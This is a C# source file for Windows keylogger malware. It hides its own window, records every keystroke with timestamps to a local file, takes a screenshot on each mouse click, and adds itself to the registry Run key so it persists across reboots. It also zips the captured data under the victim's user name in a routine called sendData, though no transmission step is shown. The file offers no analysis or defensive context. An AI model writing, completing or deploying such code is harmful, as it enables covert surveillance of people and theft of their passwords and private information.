using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO.Compression;
using System.IO;
using System.Security.Permissions;
using System.Drawing;
using Microsoft.Win32;



namespace keylogger
    {
    class Program
        {
        [DllImport("user32.dll")]
        internal static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        internal static extern int GetAsyncKeyState(Int32 i);

        static DirectoryInfo di;
        static void Main(string[] args)
            {
                
                IntPtr windowHandle = Process.GetCurrentProcess().MainWindowHandle;
                ShowWindowAsync(windowHandle, 0);

                sendData();
                setStartUp();
                StartLogging();

                
            }

        static void StartLogging()
            {
            if (Control.IsKeyLocked(Keys.CapsLock))
                Console.WriteLine("capsison");

            //WriteToFile writekeys = new WriteToFile();

                while (true)
                    {
                    //sleeping for while, this will reduce load on cpu
                    Thread.Sleep(10);

                    for (Int32 i = 0; i < 255; i++)
                        {
                        int keyState = GetAsyncKeyState(i);
                        if (keyState == 1 || keyState == -32767)
                            {

                            di = new DirectoryInfo("C:\\screen\\data");
                            if (!di.Exists) { di.Create(); }

                            String info = "<" + DateTime.Now.ToString() + ">" + (Keys)i;

                            if ((Keys)i == Keys.LButton)
                                {
                                PrintScreen ps = new PrintScreen();
                                String filename = "\\" + DateTime.Now.ToString("dd_H_mm_ss") + ".png";
                                ps.CaptureScreenToFile(di + filename, System.Drawing.Imaging.ImageFormat.Png);
                                }
                            Console.WriteLine(info);
                            //writekeys.writeData(info);
                            using(StreamWriter writeFile = new StreamWriter(@"c:\\screen\\data\\data.txt", true))
                                {
                                    writeFile.WriteLine(info);
                                }                           
                            break;
                            }

                        }
                }
            }

        static void setStartUp()
        {
            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            reg.SetValue("AutoRun", Application.ExecutablePath.ToString());
        }

        static void sendData()
        {
            di = new DirectoryInfo("C:\\screen\\data");
            if (di.Exists)
            {
                String name = Environment.UserName;
                ZipFile.CreateFromDirectory(@"C:\screen\data", @"c:\screen\" + name + ".zip");
            }
        }
    }
}
